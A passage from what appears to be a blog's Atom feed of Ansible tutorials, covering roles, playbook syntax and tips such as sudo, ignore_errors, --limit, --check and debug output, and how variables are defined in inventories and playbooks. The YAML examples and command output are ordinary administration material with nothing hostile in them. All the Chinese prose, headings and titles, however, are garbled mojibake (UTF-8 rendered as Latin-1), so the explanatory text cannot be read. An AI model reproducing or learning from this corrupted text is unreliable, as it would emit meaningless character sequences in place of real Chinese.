yum:</span><br><span class="line">    name: &quot;httpd&quot;</span><br><span class="line">    state: present</span><br><span class="line"></span><br><span class="line">#åŒç†,ä¸‹é¢æ˜¯debian.ymlæ–‡ä»¶</span><br><span class="line"># roles/example/tasks/debian.yml</span><br><span class="line">- apt:</span><br><span class="line">    name: &quot;apache2&quot;</span><br><span class="line">    state: present</span><br></pre></td></tr></table></figure><h3 id="è¿è¡Œroles"><a href="#è¿è¡Œroles" class="headerlink" title="è¿è¡Œroles"></a>è¿è¡Œroles</h3><p>è¿è¡Œroleséå¸¸ç®€å•,åªéœ€è¦åœ¨æœ€å¤–å±‚çš„Playbookä¸Šä½¿ç”¨roleså…³é”®å­—,æŒ‡å®šè¿è¡Œå“ªäº›rolesç›®å½•å³å¯:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">- hosts: webservers</span><br><span class="line">  roles:</span><br><span class="line">     - common</span><br><span class="line">     - webservers</span><br></pre></td></tr></table></figure><p>ä¸€æ—¦è¿è¡Œè¿™ä¸ªplaybook,é‚£ä¹ˆé’ˆå¯¹ä¸Šé¢è¿™2ä¸ªroles(commonå’Œwebservers),éƒ½ä¼šè‡ªåŠ¨æ‰§è¡Œä¸‹é¢æ–‡ä»¶:</p><ul><li>roles/{common,webservers}/tasks/main.yml (å¦‚æœè¯¥æ–‡ä»¶å­˜åœ¨)</li><li>roles/{common,webservers}/vars/main.yml .(å¦‚æœè¯¥æ–‡ä»¶å­˜åœ¨)</li><li>roles/{common,webservers}/default/main.yml (å¦‚æœè¯¥æ–‡ä»¶å­˜åœ¨)</li><li>roles/{common,webservers}/handlers/main.yml  (å¦‚æœè¯¥æ–‡ä»¶å­˜åœ¨,ä¸”tasksç›®å½•ä¸‹çš„playbookè°ƒç”¨äº†handlers)</li><li>â€¦â€¦.</li></ul><hr>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Ansible-Roles&quot;&gt;&lt;a href=&quot;#Ansible-Roles&quot; class=&quot;headerlink&quot; title=&quot;Ansible-Roles&quot;&gt;&lt;/a&gt;Ansible-Roles&lt;/h2&gt;&lt;p&gt;  å¯¹äºä¸­å°å‹é¡¹ç›®æ¥è¯´playbookç»“åˆincludeå°±è¶³ä»¥èƒœä»»,æ¸…æ™°,æœ‰æ•ˆçš„å®Œæˆè‡ªåŠ¨åŒ–éƒ¨ç½²å·¥ä½œäº†.ä½†æ˜¯å¦‚æœæ˜¯å¯¹äºå¤§å‹çš„é¡¹ç›®,å‡ åä¸ªplaybookæ¥è¯´,å¯èƒ½ä¼šé€ æˆæ–‡ä»¶ç¹å¤š,ç›®å½•ç»“æ„ä¸æ¸…æ™°,å‘½åä¸è§„èŒƒ,ä»¥åŠåæœŸç»´æŠ¤æˆæœ¬å¤§å¤§å‡é«˜.&lt;/p&gt;
&lt;p&gt;ansibleçš„rolesåŠŸèƒ½å°±æ˜¯ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜åº”è¿è€Œç”Ÿ.roleså­—é¢æ„æ€æ˜¯â€è§’è‰²â€,å¯ä»¥ç†è§£ä¸ºå„ä¸ªä¸åŒæ¨¡å—åŠŸèƒ½çš„å…³è”é›†åˆ.rolesä¸»è¦åŒ…æ‹¬ä»¥ä¸‹åŠŸèƒ½æ¨¡å—:var_files,tasks,handlers,templates,files,ç­‰ç­‰&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯,ä¸ºäº†è§„èŒƒå’Œç»´æŠ¤æœŸé—´.rolesåº”è¯¥å®šä¹‰ä¸€ä¸ªæ¸…æ™°,æ˜ç¡®çš„ç›®å½•ç»“æ„ä»¥åŠæ–‡ä»¶å.ä¸å¯éšæ„æ›´æ”¹.&lt;/p&gt;
    
    </summary>
    
      <category term="Ansible" scheme="https://jesse.top/categories/Ansible/"/>
    
    
      <category term="Ansible" scheme="https://jesse.top/tags/Ansible/"/>
    
  </entry>
  
  <entry>
    <title>Ansible-Playbook</title>
    <link href="https://jesse.top/2018/08/26/Ansible/Ansible%E7%9A%84Playbook%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7/"/>
    <id>https://jesse.top/2018/08/26/Ansible/Ansibleçš„Playbookä»‹ç»ä»¥åŠæŠ€å·§/</id>
    <published>2018-08-26T14:59:58.000Z</published>
    <updated>2018-12-01T14:27:37.281Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Ansibleçš„Playbookä»‹ç»ä»¥åŠæŠ€å·§"><a href="#Ansibleçš„Playbookä»‹ç»ä»¥åŠæŠ€å·§" class="headerlink" title="Ansibleçš„Playbookä»‹ç»ä»¥åŠæŠ€å·§"></a>Ansibleçš„Playbookä»‹ç»ä»¥åŠæŠ€å·§</h2><p>playbookçš„æ ¼å¼æ˜¯YAML.ä»¥ä¸‹æ˜¯ä¸€ä¸ªplaybookçš„èŒƒä¾‹:</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">- hosts: webservers</span><br><span class="line">  vars:</span><br><span class="line">    http_port: 80</span><br><span class="line">    max_clients: 200</span><br><span class="line">  remote_user: root</span><br><span class="line">  tasks:</span><br><span class="line">  - name: ensure apache is at the latest version</span><br><span class="line">    yum: pkg=httpd state=latest</span><br><span class="line">  - name: write the apache config file</span><br><span class="line">    template: src=/srv/httpd.j2 dest=/etc/httpd.conf</span><br><span class="line">    notify:</span><br><span class="line">    - restart apache</span><br><span class="line">  - name: ensure apache is running</span><br><span class="line">    service: name=httpd state=started</span><br><span class="line">  handlers:</span><br><span class="line">    - name: restart apache</span><br><span class="line">      service: name=httpd state=restarted</span><br></pre></td></tr></table></figure><p>é€šè¿‡ä¸Šé¢çš„èŒƒä¾‹å¯ä»¥æ€»ç»“å‡ºplaybookçš„åŸºç¡€è¯­æ³•å’Œæ³¨æ„ç‚¹:</p><ul><li>playbookçš„æœ€é¡¶éƒ¨ä»¥â€”3ä¸ªæ¨ªæ å¼€å¤´</li><li>ç›¸åŒå…ƒç´ ä»¥-å‡å·æ’åˆ—,åœ¨ç¼©è¿›ä¸­ç©ºæ ¼çš„æ•°é‡ä¸é‡è¦,ä½†æ˜¯ç›¸åŒé˜¶å±‚çš„å…ƒç´ è¦å·¦å¯¹é½(ä¸èƒ½ä½¿ç”¨tabå­—ç¬¦)</li><li>å¯ä»¥ä¸ä½¿ç”¨åŒå¼•å·æ¥æ‹¬ä½å­—ç¬¦ä¸²</li><li>nameæ˜¯ä»»åŠ¡çš„æè¿°,ä¸æ˜¯å¿…éœ€.ä½†æ˜¯ä¸ºäº†playbookçš„æ˜“è¯»æ€§,å»ºè®®nameè¦æœ‰.ä¸€ä¸ªnameåªèƒ½åŒ…å«ä¸€ä¸ªtask.</li></ul><h3 id="playbookçš„ä½¿ç”¨æŠ€å·§"><a href="#playbookçš„ä½¿ç”¨æŠ€å·§" class="headerlink" title="playbookçš„ä½¿ç”¨æŠ€å·§"></a>playbookçš„ä½¿ç”¨æŠ€å·§</h3><h4 id="sudoç”¨æˆ·"><a href="#sudoç”¨æˆ·" class="headerlink" title="sudoç”¨æˆ·"></a>sudoç”¨æˆ·</h4><ul><li><p>remote_userè¡¨ç¤ºplaybookå…è®¸æ—¶ä»¥å“ªä¸ªç”¨æˆ·è¿è¡Œ,å¦‚æœåŠ ä¸Šsudo:yes.è¡¨ç¤ºä»¥sudoæ–¹å¼è¿è¡Œ:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- hosts: webservers</span><br><span class="line">  remote_user: yourname</span><br><span class="line">  sudo: yes</span><br></pre></td></tr></table></figure><p>å¦‚æœæ˜¯ä»…ä»…åœ¨ä¸€ä¸ªtaskä¸­ä½¿ç”¨sudo.è€Œä¸æ˜¯åœ¨æ•´ä¸ªplaybookä¸­ä½¿ç”¨:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">- hosts: webservers</span><br><span class="line">  remote_user: yourname</span><br><span class="line">  tasks:</span><br><span class="line">    - service: name=nginx state=started</span><br><span class="line">      sudo: yes</span><br></pre></td></tr></table></figure></li></ul><h4 id="æ¨¡å—å’Œå‘½ä»¤æ¢è¡Œ"><a href="#æ¨¡å—å’Œå‘½ä»¤æ¢è¡Œ" class="headerlink" title="æ¨¡å—å’Œå‘½ä»¤æ¢è¡Œ"></a>æ¨¡å—å’Œå‘½ä»¤æ¢è¡Œ</h4><ul><li><p>k/vé”®å€¼å¯¹(æ¨¡å—å’Œå‘½ä»¤)å¯ä»¥åœ¨å†™åœ¨ä¸€è¡Œ,ç”¨:å†’å·éš”å¼€,ä¹Ÿå¯ä»¥ç”¨&gt; ç¬¦å·æ¢è¡Œ:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- name: test</span><br><span class="line">  command: &gt; </span><br><span class="line">  ls /home/</span><br></pre></td></tr></table></figure><p>å¦‚æœå‘½ä»¤è¡Œå¤ªé•¿,å¯ä»¥ç”¨ç©ºæ ¼æˆ–è€…ç¼©è¿›æ¢è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tasks:</span><br><span class="line">  - name: Copy ansible inventory file to client</span><br><span class="line">    copy: src=/etc/ansible/hosts dest=/etc/ansible/hosts</span><br><span class="line">            owner=root group=root mode=0644</span><br></pre></td></tr></table></figure></li></ul><h4 id="è°ƒç”¨å˜é‡"><a href="#è°ƒç”¨å˜é‡" class="headerlink" title="è°ƒç”¨å˜é‡"></a>è°ƒç”¨å˜é‡</h4><ul><li><p>å‘½ä»¤å¯ä»¥ç”¨å˜é‡,å˜é‡çš„å¼•ç”¨æ–¹å¼ä¸º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tasks:</span><br><span class="line">  - name: create a virtual host file for &#123;&#123; vhost &#125;&#125;</span><br><span class="line">    template: src=somefile.j2 dest=/etc/httpd/conf.d/&#123;&#123; vhost &#125;&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="å¿½ç•¥é”™è¯¯-ç»§ç»­æ‰§è¡Œåç»­çš„task"><a href="#å¿½ç•¥é”™è¯¯-ç»§ç»­æ‰§è¡Œåç»­çš„task" class="headerlink" title="å¿½ç•¥é”™è¯¯,ç»§ç»­æ‰§è¡Œåç»­çš„task"></a>å¿½ç•¥é”™è¯¯,ç»§ç»­æ‰§è¡Œåç»­çš„task</h4><ul><li><p>å¿½ç•¥é”™è¯¯,ç»§ç»­æ‰§è¡Œä¸‹ä¸€ä¸ªtask..é»˜è®¤æƒ…å†µä¸‹playbookå¦‚æœæ‰§è¡Œå‘½ä»¤å¤±è´¥å°±ä¼šç»ˆæ­¢æ•´ä¸ªPlaybookçš„æ‰§è¡Œ.ä½¿ç”¨ignore_erroså‚æ•°å¯ä»¥åœ¨æ‰§è¡ŒæŸä¸ªtaskå¤±è´¥æ—¶,è‡ªåŠ¨å¿½ç•¥ç»§ç»­æ‰§è¡Œä¸‹ä¸€ä¸ªtask:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tasks:</span><br><span class="line">  - name: run this command and ignore the result</span><br><span class="line">    shell: /usr/bin/somecommand</span><br><span class="line">    ignore_errors: True</span><br></pre></td></tr></table></figure><p>æˆ–è€…é‡‡ç”¨ä¸‹åˆ—æ–¹å¼.å¦‚æœsomecommandå¤±è´¥,åˆ™æ‰§è¡ŒæŸä¸ªä¸€å®šä¸ºtrueçš„å‘½ä»¤:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tasks:</span><br><span class="line">  - name: run this command and ignore the result</span><br><span class="line">    shell: /usr/bin/somecommand || /bin/true</span><br></pre></td></tr></table></figure></li></ul><h4 id="limité™å®šæ‰§è¡Œçš„ä¸»æœºèŒƒå›´"><a href="#limité™å®šæ‰§è¡Œçš„ä¸»æœºèŒƒå›´" class="headerlink" title="limité™å®šæ‰§è¡Œçš„ä¸»æœºèŒƒå›´"></a>limité™å®šæ‰§è¡Œçš„ä¸»æœºèŒƒå›´</h4><ul><li><p>limitå‚æ•° é™å®šæ‰§è¡Œçš„ä¸»æœºèŒƒå›´.ä¾‹å¦‚ä¸‹é¢çš„ä¾‹å­é™å®šåœ¨centos7è¿™å°ä¸»æœºä¸Šæ‰§è¡Œ.å½“ç„¶ä¹Ÿå¯ä»¥é™å®šåœ¨ä¸€ä¸ªç»„å†…çš„ä¸»æœºä¸Šæ‰§è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@ansible ansible]$ansible-playbook test.yaml --limit centos7</span><br></pre></td></tr></table></figure></li><li><p>â€“list-hostså‚æ•°æŸ¥çœ‹ä¸€ä¸ªPlaybookå½±å“çš„æ‰€æœ‰ä¸»æœº.ä¾‹å¦‚ä¸‹åˆ—å‘½ä»¤å¯ä»¥çœ‹åˆ°Playbookå°†åœ¨å“ªäº›ä¸»æœºä¸Šæ‰§è¡Œ:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@ansible ansible]$ansible-playbook test.yaml --list-hosts</span><br><span class="line"></span><br><span class="line">playbook: test.yaml</span><br><span class="line"></span><br><span class="line">  play #1 (all): allTAGS: []</span><br><span class="line">    pattern: [&apos;all&apos;]</span><br><span class="line">    hosts (3):</span><br><span class="line">      centos6</span><br><span class="line">      centos7</span><br><span class="line">      web</span><br></pre></td></tr></table></figure></li></ul><h4 id="æ£€æµ‹æ‰§è¡Œè¿‡ç¨‹"><a href="#æ£€æµ‹æ‰§è¡Œè¿‡ç¨‹" class="headerlink" title="æ£€æµ‹æ‰§è¡Œè¿‡ç¨‹"></a>æ£€æµ‹æ‰§è¡Œè¿‡ç¨‹</h4><ul><li><p>â€“ check æ£€æµ‹æ¨¡å¼,playbookå®šä¹‰çš„ä»»åŠ¡å°†åœ¨æ¯å°è¿œç¨‹ä¸»æœºä¸Šè¿›è¡Œæ£€æµ‹,ä½†æ˜¯å¹¶ä¸çœŸæ­£æ‰§è¡Œ:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@ansible ansible]$ansible-playbook test.yaml --check</span><br></pre></td></tr></table></figure></li></ul><blockquote><p>listâ€“tasksæœ‰ç›¸ä¼¼çš„ä½œç”¨,å®ƒåˆ—å‡ºäº†playbookçš„taskä»»åŠ¡å®‰æ’:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&gt; [root@localhost playbook]$ansible-playbook --list-tasks nginx.yaml</span><br><span class="line">&gt;  [WARNING]: Could not match supplied host pattern, ignoring: 10.0.4.240</span><br><span class="line">&gt; </span><br><span class="line">&gt; </span><br><span class="line">&gt; playbook: nginx.yaml</span><br><span class="line">&gt; </span><br><span class="line">&gt;   play #1 (10.0.4.240): 10.0.4.240TAGS: []</span><br><span class="line">&gt;     tasks:</span><br><span class="line">&gt;       check if there is nginx repo on serverTAGS: []</span><br><span class="line">&gt;       install nginx yum repo,if there is no nginx repoTAGS: []</span><br><span class="line">&gt;       install nginxTAGS: []</span><br><span class="line">&gt;       create nginx document dirTAGS: []</span><br><span class="line">&gt;       create nginx log dirTAGS: []</span><br><span class="line">&gt;       copy nginx configure fileTAGS: []</span><br><span class="line">&gt;       copy nginx web fileTAGS: []</span><br><span class="line">&gt;       start nginxTAGS: []</span><br><span class="line">&gt; </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h4 id="æ‰§è¡Œå¹¶å‘æ•°"><a href="#æ‰§è¡Œå¹¶å‘æ•°" class="headerlink" title="æ‰§è¡Œå¹¶å‘æ•°"></a>æ‰§è¡Œå¹¶å‘æ•°</h4><ul><li>â€“forks=æ•°å­—.æŒ‡å®šå¹¶å‘æ‰§è¡Œçš„ä»»åŠ¡æ•°.é»˜è®¤æ˜¯5.è°ƒé«˜è¿™ä¸ªå€¼å¯ä»¥åŠ å¿«ansibleæ‰§è¡Œæ•ˆç‡</li></ul><h4 id="debugæ˜¾ç¤ºæ‰§è¡Œç»“æœ"><a href="#debugæ˜¾ç¤ºæ‰§è¡Œç»“æœ" class="headerlink" title="debugæ˜¾ç¤ºæ‰§è¡Œç»“æœ"></a>debugæ˜¾ç¤ºæ‰§è¡Œç»“æœ</h4><ul><li>æ˜¾ç¤ºå‘½ä»¤çš„æ‰§è¡Œè¿”å›ç»“æœ.Asibleé»˜è®¤å¹¶ä¸ä¼šæ˜¾ç¤ºå‘½ä»¤çš„æ‰§è¡Œç»“æœ,é€šè¿‡debugæ¨¡å—å¯ä»¥è¾“å‡ºå‘½ä»¤çš„æ‰§è¡Œç»“æœ.ä¾‹å¦‚:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">---</span><br><span class="line">  - hosts: all</span><br><span class="line">    remote_user: root</span><br><span class="line">    tasks:</span><br><span class="line">      - name: get variables</span><br><span class="line">        shell: cat /etc/redhat-release</span><br><span class="line">        register: foo</span><br><span class="line">      - name: print variable</span><br><span class="line">        debug: msg=&quot;the vairables is &#123;&#123; foo.stdout &#125;&#125;&quot;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œç»“æœ:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[root@ansible ansible]$ansible-playbook test.yaml --limit centos7</span><br><span class="line"></span><br><span class="line">PLAY [all] **********************************************************************************************************************************</span><br><span class="line"></span><br><span class="line">TASK [Gathering Facts] **********************************************************************************************************************</span><br><span class="line">ok: [centos7]</span><br><span class="line"></span><br><span class="line">TASK [get variables] ************************************************************************************************************************</span><br><span class="line">changed: [centos7]</span><br><span class="line"></span><br><span class="line">TASK [print variable] ***********************************************************************************************************************</span><br><span class="line">ok: [centos7] =&gt; &#123;</span><br><span class="line">    &quot;msg&quot;: &quot;the vairables is CentOS Linux release 7.2.1511 (Core) &quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PLAY RECAP **********************************************************************************************************************************</span><br><span class="line">centos7                    : ok=3    changed=1    unreachable=0    failed=0</span><br></pre></td></tr></table></figure><p>æˆ–è€…ä½¿ç”¨ä¸‹é¢çš„è¯­å¥.ç»“æœæ˜¯ä¸€æ ·çš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">  - hosts: all</span><br><span class="line">    remote_user: root</span><br><span class="line">    tasks:</span><br><span class="line">      - name: get variables</span><br><span class="line">        shell: cat /etc/redhat-release</span><br><span class="line">        register: foo</span><br><span class="line">      - name: print variable</span><br><span class="line">        #debug: msg=&quot;the vairables is &#123;&#123; foo.stdout &#125;&#125;&quot;</span><br><span class="line">        debug: var=foo.stdout</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œç»“æœ:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[root@ansible ansible]$ansible-playbook test.yaml --limit centos7</span><br><span class="line"></span><br><span class="line">PLAY [all] **********************************************************************************************************************************</span><br><span class="line"></span><br><span class="line">TASK [Gathering Facts] **********************************************************************************************************************</span><br><span class="line">ok: [centos7]</span><br><span class="line"></span><br><span class="line">TASK [get variables] ************************************************************************************************************************</span><br><span class="line">changed: [centos7]</span><br><span class="line"></span><br><span class="line">TASK [print variable] ***********************************************************************************************************************</span><br><span class="line">ok: [centos7] =&gt; &#123;</span><br><span class="line">    &quot;foo.stdout&quot;: &quot;CentOS Linux release 7.2.1511 (Core) &quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PLAY RECAP **********************************************************************************************************************************</span><br><span class="line">centos7                    : ok=3    changed=1    unreachable=0    failed=0</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Ansibleçš„Playbookä»‹ç»ä»¥åŠæŠ€å·§&quot;&gt;&lt;a href=&quot;#Ansibleçš„Playbookä»‹ç»ä»¥åŠæŠ€å·§&quot; class=&quot;headerlink&quot; title=&quot;Ansibleçš„Playbookä»‹ç»ä»¥åŠæŠ€å·§&quot;&gt;&lt;/a&gt;Ansibleçš„Playbookä»‹ç»ä»¥åŠæŠ€å·§&lt;/h2&gt;&lt;p&gt;playbookçš„æ ¼å¼æ˜¯YAML.ä»¥ä¸‹æ˜¯ä¸€ä¸ªplaybookçš„èŒƒä¾‹:&lt;/p&gt;
    
    </summary>
    
      <category term="Ansible" scheme="https://jesse.top/categories/Ansible/"/>
    
    
      <category term="Ansible" scheme="https://jesse.top/tags/Ansible/"/>
    
  </entry>
  
  <entry>
    <title>Ansibleå˜é‡</title>
    <link href="https://jesse.top/2018/08/26/Ansible/Ansible%E5%8F%98%E9%87%8F/"/>
    <id>https://jesse.top/2018/08/26/Ansible/Ansibleå˜é‡/</id>
    <published>2018-08-26T14:59:58.000Z</published>
    <updated>2018-12-01T14:27:37.281Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Ansibleå˜é‡"><a href="#Ansibleå˜é‡" class="headerlink" title="Ansibleå˜é‡"></a>Ansibleå˜é‡</h2><p>ansibleæœ‰å¤šé‡æ–¹å¼å®šä¹‰å˜é‡,è¿˜å¯ä»¥é€šè¿‡factæ¥è·å–å˜é‡.æ¥ä¸‹æ¥å­¦ä¹ ä¸€ä¸‹ansibled å˜é‡çŸ¥è¯†</p><hr><a id="more"></a><h3 id="åœ¨Inventoryä¸»æœºæ–‡ä»¶ä¸­å®šä¹‰å˜é‡"><a href="#åœ¨Inventoryä¸»æœºæ–‡ä»¶ä¸­å®šä¹‰å˜é‡" class="headerlink" title="åœ¨Inventoryä¸»æœºæ–‡ä»¶ä¸­å®šä¹‰å˜é‡"></a>åœ¨Inventoryä¸»æœºæ–‡ä»¶ä¸­å®šä¹‰å˜é‡</h3><p>å¯ä»¥å¯¹æ¯å°ä¸»æœºåˆ†é…å…·ä½“çš„å˜é‡,ç„¶ååœ¨playbookä¸­è°ƒç”¨.ä¾‹å¦‚ä¸‹é¢çš„ä¸»æœºHostå’Œhost2çš„å˜é‡å®šä¹‰:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[atlanta]</span><br><span class="line">host1 http_port=80 maxRequestsPerChild=808</span><br><span class="line">host2 http_port=303 maxRequestsPerChild=909</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥å®šä¹‰å±äºæ•´ä¸ªç»„çš„å˜é‡,è¿™äº›å˜é‡åœ¨ç»„å†…çš„æ‰€æœ‰æœåŠ¡å™¨èŠ‚ç‚¹ä¸Šç”Ÿæ•ˆ:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[atlanta]</span><br><span class="line">host1</span><br><span class="line">host2</span><br><span class="line"></span><br><span class="line">[atlanta:vars]</span><br><span class="line">ntp_server=ntp.atlanta.example.com</span><br><span class="line">proxy=proxy.atlanta.example.com</span><br></pre></td></tr></table></figure><p>ansibleè¿˜ä¼šä»/etc/ansible/host_varsç›®å½•ä¸‹å¯»æ‰¾ä¸»æœºåå‘½åçš„å˜é‡æ–‡ä»¶.ä¾‹å¦‚å¦‚æœinventoryä¸‹æœ‰ä¸ªhost1ä¸»æœº,åˆ™å¯ä»¥åœ¨/etc/ansible/host_varsç›®å½•ä¸‹åˆ›å»ºhost1æ–‡ä»¶.å¹¶ä¸”å®šä¹‰å¦‚ä¸‹å†…å®¹:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">foo: bar</span><br><span class="line">baz: qux</span><br></pre></td></tr></table></figure><p>åˆ™ä»¥ä¸Š2ä¸ªå˜é‡åˆ™ä¼šåº”ç”¨åˆ°host1ä¸»æœºä¸­.</p><p>åŒç†,å¯ä»¥åœ¨/etc/ansible/group_varsç›®å½•ä¸‹åˆ›å»ºä¸»æœºç»„å‘½åçš„å˜é‡æ–‡ä»¶,æ¯”å¦‚æ–°å»ºä¸€ä¸ªatlantaæ–‡ä»¶,ä¸”å®šä¹‰ä¸Šé¢å˜é‡,åˆ™è¿™2ä¸ªå˜é‡ä¼šè¢«åº”ç”¨åˆ°æ•´ä¸ªatlantaä¸»æœºç»„</p><hr><h2 id="åœ¨playbookä¸­å®šä¹‰å˜é‡"><a href="#åœ¨playbookä¸­å®šä¹‰å˜é‡" class="headerlink" title="åœ¨playbookä¸­å®šä¹‰å˜é‡"></a>åœ¨playbookä¸­å®šä¹‰å˜é‡</h2><p>1.åœ¨playbookä¸­å®šä¹‰varså­—æ®µå¯ä»¥å®šä¹‰å˜é‡.ä¾‹å¦‚:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vars:</span><br><span class="line">  key_files: /etc/nginx/ssl/nginx.key</span><br><span class="line">  cert_files: /etc/nginx/ssl/nginx.crt</span><br><span class="line">  conf_files: /etc/nginx/sites-avaliable/default</span><br></pre></td></tr></table></figure><blockquote><p>note: åœ¨Inventoryæ–‡ä»¶ä¸­å®šä¹‰å˜é‡æ˜¯ç”¨var=value,è€Œåœ¨Playbookä»¥åŠä¸‹é¢è®²åˆ°çš„yamlæ ¼å¼çš„å˜é‡æ–‡ä»¶ä¸­å˜é‡æ ¼å¼ä¸ºvar: value</p></blockquote><p>2.è¿˜å¯ä»¥é€šè¿‡vars_fileså­—æ®µå®šä¹‰ä¸€ä¸ªæ–‡ä»¶.ç„¶åå°†å˜é‡å†™å…¥åˆ°è¿™ä¸ªæ–‡ä»¶å†…:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vars_files:</span><br><span class="line">   - nginx.yml</span><br><span class="line">   </span><br><span class="line">nginx.ymlæ–‡ä»¶å†…å®¹å¦‚ä¸‹:</span><br><span class="line">  key_files: /etc/nginx/ssl/nginx.key</span><br><span class="line">  cert_files: /etc/nginx/ssl/nginx.crt</span><br><span class="line">  conf_files: 